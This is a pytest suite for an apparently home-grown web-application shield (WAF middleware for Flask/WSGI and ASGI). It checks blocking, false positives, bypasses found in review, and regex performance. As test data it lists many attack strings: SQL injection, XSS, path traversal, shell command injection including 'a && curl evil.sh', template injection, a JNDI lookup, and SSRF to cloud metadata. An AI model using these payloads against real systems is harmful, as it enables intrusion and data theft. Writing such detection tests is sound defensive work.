"""Runtime shield: blocks attacks, lets real users through, works for WSGI and ASGI."""
import asyncio
import json

import pytest
from flask import Flask, request

from aegis.models import Incident
from aegis.shield import AegisShield, AegisShieldASGI, ShieldConfig, score_value
from aegis.shield.alerts import TelegramAlerter, format_alert
from aegis.shield.core import ShieldCore

ATTACKS = [
    "admin' --", "' OR '1'='1", "x' UNION SELECT password FROM users--", "1 or 1=1", "1; DROP TABLE users",
    "UNION/**/SELECT 1", "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)",
    "../../etc/passwd", "..%2f..%2fsecret.txt", "%252e%252e%252fsecret", "127.0.0.1 & echo X", "8.8.8.8; cat /etc/passwd",
    "$(whoami)", "`id`", "a && curl evil.sh", "{{7*7}}", "{% for x in y %}", "__import__('os')",
    "${jndi:ldap://e/a}", "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd",
]

BENIGN = [
    "laptop", "O'Brien Mug", "rock & roll", "fish & chips", "cats; dogs", "C# tutorial", "<3 love it",
    "price 1 OR 2", "a@b.com", "docs/readme.txt", "it's fine -- really", "Tom's", "100% cotton",
    "SELECT the best", "Union Square cafe", "and/or", "8.8.8.8", "Hello {name}", "2+2=4", "Москва",
    "Алматы, ул. Абая 10", "50/50", "C:/Users/me", "where is O'Hare?", "drop me a line; thanks", "sleep well",
    'I said: "hi"', "a | b", "x & y & z", "https://example.com/page?id=5", '{"a": 1}', "<b>bold</b>",
    "--verbose", "#hashtag", "rm -rf is dangerous", "Echo Dot speaker", "Q&A session", "R&D budget",
    "AT&T", "1,000 KZT", "user_name", "self-esteem", "don't stop", "ca$h", "$5 off", "50% off; today only",
]


@pytest.mark.parametrize("payload", ATTACKS)
def test_attacks_score_high(payload):
    assert score_value(payload)[1] >= 0.8


@pytest.mark.parametrize("payload", BENIGN)
def test_benign_input_scores_low(payload):
    assert score_value(payload)[1] < 0.8


def make_app():
    app = Flask(__name__)

    @app.route("/search")
    def search():
        return "ok:" + request.args.get("q", "")

    @app.route("/login", methods=["POST"])
    def login():
        return "ok:" + request.form.get("password", "")

    @app.route("/api", methods=["POST"])
    def api():
        return "ok:" + json.dumps(request.get_json())

    @app.route("/health")
    def health():
        return "ok"

    return app


def client(**options):
    app = make_app()
    shield = AegisShield(app.wsgi_app, ShieldConfig(**options))
    app.wsgi_app = shield
    return app.test_client(), shield


def test_blocks_attack_and_records_incident():
    c, shield = client()
    r = c.get("/search", query_string={"q": "' OR '1'='1"})
    assert r.status_code == 403 and r.json["reason"] == "sqli"
    inc = shield.incidents[0]
    assert inc.param == "q" and inc.location == "query" and inc.blocked and r.headers["X-Aegis-Incident"] == inc.id


def test_passes_normal_traffic():
    c, shield = client()
    for q in ["laptop", "O'Brien", "rock & roll"]:
        assert c.get("/search", query_string={"q": q}).status_code == 200
    assert not shield.incidents


def test_monitor_mode_logs_but_does_not_block(tmp_path):
    log = tmp_path / "incidents.jsonl"
    c, shield = client(mode="monitor", log_path=str(log))
    r = c.get("/search", query_string={"q": "<script>alert(1)</script>"})
    assert r.status_code == 200 and shield.incidents and not shield.incidents[0].blocked
    assert json.loads(log.read_text(encoding="utf-8").splitlines()[0])["attack_type"] == "xss"


def test_form_body_is_inspected_and_still_readable():
    c, _ = client()
    assert c.post("/login", data={"password": "x", "user": "admin' --"}).status_code == 403
    r = c.post("/login", data={"password": "correct horse"})
    assert r.status_code == 200 and r.get_data(as_text=True) == "ok:correct horse"


def test_passwords_get_a_higher_threshold():
    c, _ = client()
    assert c.post("/login", data={"password": "Pa$$w0rd'--x"}).status_code == 200


def test_json_bodies_are_inspected():
    c, _ = client()
    assert c.post("/api", json={"filters": {"name": "x' UNION SELECT 1 --"}}).status_code == 403
    assert c.post("/api", json={"filters": {"name": "Laptop"}}).status_code == 200


def test_cookies_and_scanner_user_agents():
    c, _ = client()
    c.set_cookie("session", "{{7*7}}")
    assert c.get("/search").status_code == 403
    c2, _ = client()
    assert c2.get("/search", headers={"User-Agent": "sqlmap/1.7"}).status_code == 403


def test_skip_paths():
    c, _ = client()
    assert c.get("/health", query_string={"q": "<script>"}).status_code == 200


def test_repeat_offender_is_banned():
    c, shield = client(ban_after=2, ban_seconds=60)
    c.get("/search", query_string={"q": "<script>"})
    c.get("/search", query_string={"q": "<script>"})
    r = c.get("/search", query_string={"q": "laptop"})
    assert r.status_code == 403 and "banned" in r.json["reason"]


def test_callbacks_receive_incidents():
    seen = []
    app = make_app()
    app.wsgi_app = AegisShield(app.wsgi_app, on_incident=[seen.append])
    app.test_client().get("/search", query_string={"q": "../../etc/passwd"})
    assert seen and seen[0].attack_type == "path_traversal"


# --------------------------------------------------------------------- ASGI --

async def echo_app(scope, receive, send):
    body = b""
    more = True
    while more:
        msg = await receive()
        body += msg.get("body", b"")
        more = msg.get("more_body", False)
    await send({"type": "http.response.start", "status": 200, "headers": [(b"content-type", b"text/plain")]})
    await send({"type": "http.response.body", "body": b"echo:" + body})


def call_asgi(app, path="/", query=b"", body=b"", headers=()):
    sent = []
    chunks = [body[:5], body[5:]] if body else [b""]

    async def receive():
        chunk = chunks.pop(0) if chunks else b""
        return {"type": "http.request", "body": chunk, "more_body": bool(chunks)}

    async def send(msg):
        sent.append(msg)

    scope = {"type": "http", "method": "POST", "path": path, "query_string": query,
             "headers": [(b"content-type", b"application/x-www-form-urlencoded"), *headers], "client": ("1.2.3.4", 5)}
    asyncio.run(app(scope, receive, send))
    return sent[0]["status"], b"".join(m.get("body", b"") for m in sent[1:])


def test_asgi_blocks_query_attack():
    app = AegisShieldASGI(echo_app)
    status, body = call_asgi(app, query=b"q=%3Cscript%3Ealert(1)%3C/script%3E")
    assert status == 403 and b"xss" in body and app.incidents[0].client == "1.2.3.4"


def test_asgi_blocks_body_attack_and_replays_clean_body():
    app = AegisShieldASGI(echo_app)
    assert call_asgi(app, body=b"name=x%27+UNION+SELECT+1--")[0] == 403
    status, body = call_asgi(app, body=b"name=Magzhan&city=Shymkent")
    assert status == 200 and body == b"echo:name=Magzhan&city=Shymkent"


# ------------------------------------------------------------------- alerts --

def test_alert_text_and_throttle(monkeypatch):
    inc = Incident("abc123", 0.0, "1.2.3.4", "GET", "/search", "query", "q", "' OR 1=1", "sqli", 0.9, True, 0.1)
    text = format_alert(inc, "shop.kz")
    assert "SQL injection" in text and "shop.kz" in text and "BLOCKED" in text
    sent = []
    monkeypatch.setattr("aegis.shield.alerts._post", lambda url, payload, headers=None: sent.append((url, payload)))
    monkeypatch.setattr("threading.Thread", lambda target, args, daemon: type("T", (), {"start": lambda self: target(*args)})())
    alerter = TelegramAlerter("TOKEN", "42", "shop.kz", cooldown=60)
    alerter.send(inc)
    alerter.send(inc)  # throttled
    assert len(sent) == 1 and sent[0][0].endswith("/botTOKEN/sendMessage") and sent[0][1]["chat_id"] == "42"


def test_oversized_form_body_cannot_hide_payload():
    from aegis.shield.core import MAX_BODY
    c, shield = client()
    padding = "a" * (MAX_BODY + 10)
    r = c.post("/login", data={"pad": padding, "user": "admin' --"})
    assert r.status_code == 403 and shield.incidents[0].attack_type == "oversized_body"


def test_chunked_body_is_inspected():
    import io
    from aegis.shield import AegisShield

    seen = {}

    def app(environ, start_response):
        seen["body"] = environ["wsgi.input"].read()
        start_response("200 OK", [("Content-Type", "text/plain")])
        return [b"ok"]

    shield = AegisShield(app)
    def call(body):
        status = {}
        env = {"REQUEST_METHOD": "POST", "PATH_INFO": "/x", "QUERY_STRING": "", "CONTENT_TYPE": "application/x-www-form-urlencoded",
               "HTTP_TRANSFER_ENCODING": "chunked", "wsgi.input_terminated": True, "wsgi.input": io.BytesIO(body),
               "REMOTE_ADDR": "9.9.9.9"}
        shield(env, lambda s, h: status.setdefault("s", s))
        return status["s"]
    assert call(b"q=%27+OR+%271%27%3D%271").startswith("403")
    assert call(b"q=laptop").startswith("200") and seen["body"] == b"q=laptop"


def test_large_file_upload_passes_and_streams_intact():
    from aegis.shield.core import MAX_BODY
    c, _ = client()
    import io
    data = {"file": (io.BytesIO(b"x" * (MAX_BODY + 100)), "big.bin")}
    assert c.post("/login", data=data, content_type="multipart/form-data").status_code == 200


def test_shield_fails_open_on_internal_error(monkeypatch):
    c, shield = client()
    monkeypatch.setattr(shield.core, "inspect", lambda *a, **k: 1 / 0)
    assert c.get("/search", query_string={"q": "laptop"}).status_code == 200 and shield.errors == 1


def test_multipart_text_fields_are_inspected():
    """Flask reads multipart fields into request.form, so an attacker can switch encodings."""
    import io
    c, shield = client()
    r = c.post("/login", data={"user": "admin' OR '1'='1' --", "password": "x"}, content_type="multipart/form-data")
    assert r.status_code == 403 and shield.incidents[-1].param == "user"
    traversal = {"avatar": (io.BytesIO(b"\x89PNG"), "../../etc/passwd")}
    assert c.post("/login", data=traversal, content_type="multipart/form-data").status_code == 403
    ok = {"password": "correct horse", "avatar": (io.BytesIO(b"' OR 1=1 -- <script>"), "me.png")}
    r = c.post("/login", data=ok, content_type="multipart/form-data")
    assert r.status_code == 200 and r.get_data(as_text=True) == "ok:correct horse"


def test_asgi_inspects_multipart_fields():
    app = AegisShieldASGI(echo_app)
    boundary = b"XyZ"
    body = (b"--XyZ\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\n<script>alert(1)</script>\r\n--XyZ--\r\n")
    sent = []
    chunks = [body]

    async def receive():
        return {"type": "http.request", "body": chunks.pop(0) if chunks else b"", "more_body": False}

    async def send(msg):
        sent.append(msg)

    scope = {"type": "http", "method": "POST", "path": "/", "query_string": b"", "client": ("9.9.9.9", 1),
             "headers": [(b"content-type", b"multipart/form-data; boundary=" + boundary)]}
    asyncio.run(app(scope, receive, send))
    assert sent[0]["status"] == 403


# ------------------------------------------------- hardening (independent review) --

def test_unparseable_body_never_switches_inspection_off():
    """A deeply nested JSON body used to crash the parser and make the shield fail open."""
    c, shield = client()
    r = c.post("/api", query_string={"q": "zzz' UNION SELECT username, password FROM users --"},
               data="[" * 100_000, content_type="application/json")
    assert r.status_code == 403 and shield.errors == 0
    deep = "[" * 5000 + "\"<script>alert(1)</script>\"" + "]" * 5000
    assert c.post("/api", data=deep, content_type="application/json").status_code == 403


def test_multipart_charset_trick_and_big_file_before_field():
    import io
    from aegis.shield.core import MAX_BODY
    c, _ = client()
    b = "----aegis"
    payload = ("--" + b + "\r\nContent-Disposition: form-data; name=\"user\"\r\n"
               "Content-Type: text/plain; charset=utf-16\r\n\r\nadmin' OR '1'='1' --\r\n--" + b + "--\r\n").encode()
    r = c.post("/login", data=payload, content_type=f"multipart/form-data; boundary={b}")
    assert r.status_code == 403
    data = {"file": (io.BytesIO(b"x" * (MAX_BODY + 5000)), "big.bin"), "user": "admin' OR '1'='1' --"}
    assert c.post("/login", data=data, content_type="multipart/form-data").status_code == 403
    data = {"file": (io.BytesIO(b"x" * (MAX_BODY + 5000)), "big.bin"), "password": "pw"}
    r = c.post("/login", data=data, content_type="multipart/form-data")
    assert r.status_code == 200 and r.get_data(as_text=True) == "ok:pw"


def test_upload_above_limit_is_blocked_only_when_configured():
    import io
    c, _ = client(max_upload=10_000)
    data = {"file": (io.BytesIO(b"x" * 20_000), "a.bin"), "password": "pw"}
    assert c.post("/login", data=data, content_type="multipart/form-data").status_code == 403
    c, _ = client(max_upload=10_000, block_oversized=False)
    data = {"file": (io.BytesIO(b"x" * 20_000), "a.bin"), "password": "pw"}
    assert c.post("/login", data=data, content_type="multipart/form-data").get_data(as_text=True) == "ok:pw"


def test_skip_paths_match_whole_segments():
    c, _ = client(skip_paths=("/health",))
    assert c.get("/health").status_code == 200
    assert c.get("/healthcare", query_string={"q": "<script>alert(1)</script>"}).status_code == 403


def test_forwarded_for_uses_the_entry_added_by_our_proxy():
    c, shield = client(trust_proxy=True, ban_after=1)
    spoofed = {"X-Forwarded-For": "203.0.113.50, 198.51.100.7"}  # client wrote the first, proxy added the second
    c.get("/search", query_string={"q": "<script>alert(1)</script>"}, headers=spoofed)
    assert shield.core.is_banned("198.51.100.7") and not shield.core.is_banned("203.0.113.50")


def test_fail_closed_option(monkeypatch):
    c, shield = client(fail_open=False)
    monkeypatch.setattr(shield.core, "inspect", lambda *a, **k: 1 / 0)
    r = c.get("/search", query_string={"q": "laptop"})
    assert r.status_code == 403 and r.headers["X-Aegis-Incident"] == "error"


def test_incident_memory_is_bounded():
    c, shield = client(max_incidents=5, ban_after=0)
    for i in range(12):
        c.get("/search", query_string={"q": f"<script>alert({i})</script>"})
    assert len(shield.incidents) == 5 and "alert(11)" in shield.incidents[-1].payload


@pytest.mark.parametrize("payload", [
    "x' OR TRUE--", "x' AND SUBSTR((SELECT password FROM users LIMIT 1),1,1)='a", "1 OR 2>1",
    '" autofocus onfocus="alert(1)', "jav&#x09;ascript:alert(1)", "127.0.0.1 && printf AEGIS_CANARY",
    "127.0.0.1 & echo AEGIS_CANARY", ";head secret.txt", ";/usr/bin/id", ";id", "/proc/self/environ",
    "open('secret.txt').read()", "http://2130706433/", "http://[::ffff:127.0.0.1]/",
])
def test_bypasses_found_in_review_are_detected(payload):
    assert score_value(payload)[1] >= 0.8


@pytest.mark.parametrize("text", [
    "Order (2 items) #4521", "Tried it; update: works now", "Hello,\nNet amount is 50 000 KZT", "Name | ID | Email",
    "Hi {{first_name}}, your order has shipped", "I like dogs; cat people too", "2 < 3 and 5 > 4",
    "https://example.com/page?id=5&sort=asc", 'He said "yes" and 2 people left', "(Select a size from the menu)",
    # round 5: quotes and dashes as people write them, attributes outside a tag
    'товар "Хит" -- скидка', '"Pro" #1 продаж', "Rock 'n' roll or 'jazz'", "it's or 'that'",
    "style=color:red", "x onerror=y",
])
def test_false_positives_found_in_review_pass(text):
    assert score_value(text)[1] < 0.8


@pytest.mark.parametrize("path", ["/blog/2024/03/error.log-analysis/", "/catalog/perl/lib/",
                                  "/catalog/dockerfile-poster/"])
def test_paths_that_only_look_like_restricted_files(path):
    from aegis.shield.detectors import analyze
    assert analyze([("path", "path", path)], 0.8) is None


def test_server_side_includes():
    from aegis.shield.detectors import analyze
    for payload in ('<!--#include file="secret" -->', '"><!--#EXEC cmd="dir "--><'):
        assert analyze([("query", "q", payload)], 0.8).attack_type == "command_injection"


def test_local_referer_is_not_ssrf():
    """Browsing an app on localhost sends Referer: http://localhost/...; found while attacking with sqlmap."""
    c, _ = client()
    r = c.get("/search", query_string={"q": "laptop"}, headers={"Referer": "http://127.0.0.1:8080/search?q=a"})
    assert r.status_code == 200
    r = c.get("/search", query_string={"q": "laptop"}, headers={"Referer": "http://x/<script>alert(1)</script>"})
    assert r.status_code == 403


# --- second review (round 3): parameter pollution, regex blow-up, oversized bodies -----------------

def test_comment_split_repeated_parameter_is_reassembled():
    core = ShieldCore(ShieldConfig(mode="block"))
    split = "id=5/*&id=*/UNION/*&id=*/ALL/*&id=*/SELECT/*&id=*/NULL,password/*&id=*/FROM/*&id=*/users"
    verdict = core.inspect("10.0.0.1", "GET", "/", core.collect_inputs("/", split, {}, b"", ""))
    assert verdict.blocked and verdict.incident.attack_type == "sqli"
    assert verdict.incident.param.startswith("id[")


def test_repeated_benign_parameters_stay_clean():
    core = ShieldCore(ShieldConfig(mode="block"))
    for query in ("tag=red&tag=blue&tag=green", "id=1&id=2&id=3", "sort=name&sort=-date",
                  "q=select a plan&q=from our shop"):
        assert not core.inspect("10.0.0.2", "GET", "/", core.collect_inputs("/", query, {}, b"", "")).blocked, query


def test_relaxed_fields_are_not_reassembled():
    core = ShieldCore(ShieldConfig(mode="block"))
    body = b"password=a' OR '&password=1'='1"
    inputs = core.collect_inputs("/login", "", {}, body, "application/x-www-form-urlencoded")
    assert not [i for i in inputs if "[" in i[1]]
    from aegis.shield.detectors import reassembled
    assert reassembled(inputs, {"password"}) == []


def test_long_adversarial_values_are_scored_quickly():
    import time
    from urllib.parse import urlencode
    core = ShieldCore(ShieldConfig(mode="monitor", ban_after=0))
    for chunk in ("{{", "\n", "'on", "<", "<a on", "$(", "`", "' or ", "%0a", "{%"):
        value = (chunk * (50_000 // len(chunk)))[:50_000]
        t = time.perf_counter()
        core.inspect("10.0.0.3", "GET", "/s", core.collect_inputs("/s", urlencode({"q": value}), {}, b"", ""))
        assert time.perf_counter() - t < 1.0, chunk


def test_payload_past_the_first_window_is_found():
    from aegis.shield.detectors import WINDOW, score_all
    value = "x" * (WINDOW * 3) + " UNION ALL SELECT password FROM users"
    assert score_all(value)[0] == "sqli"


def test_oversized_body_policy():
    from aegis.shield.core import oversize_is_suspicious
    cfg = ShieldConfig()
    assert oversize_is_suspicious("", cfg)                      # no type: parsed as a form by many apps
    assert oversize_is_suspicious("application/x-www-form-urlencoded", cfg)
    assert oversize_is_suspicious("application/x-custom", cfg)  # unknown types are not trusted
    assert not oversize_is_suspicious("application/octet-stream", cfg)
    assert not oversize_is_suspicious("image/png", cfg)
    assert oversize_is_suspicious("application/octet-stream", ShieldConfig(binary_uploads=False))


ADVERSARIAL = ["'", '"', "<", ">", "{", "}", "(", ")", " ", "a", "1", "on", "{{", "{%", "<a ", "' or ", "%",
               "\\", "/", ";", "=", "&", "|", "-", "\n", "\r\n", ".", ",", "$(", "`", "../", "or 1", "<x on",
               "'on", "x\"on", "/*", "*/", "union ", "select "]


def test_every_signature_is_linear_on_adversarial_repeats():
    """A new signature with an unbounded span after a separator is how regex blow-up comes back."""
    import time
    from aegis.shield.detectors import SIGNATURES
    slow = []
    for cls, sigs in SIGNATURES.items():
        for name, pattern, _ in sigs:
            for chunk in ADVERSARIAL:
                value = (chunk * (5000 // len(chunk)))[:5000]
                t = time.perf_counter()
                pattern.search(value)
                if time.perf_counter() - t > 0.05:
                    slow.append(f"{cls}/{name} on {chunk!r}")
    assert not slow, slow
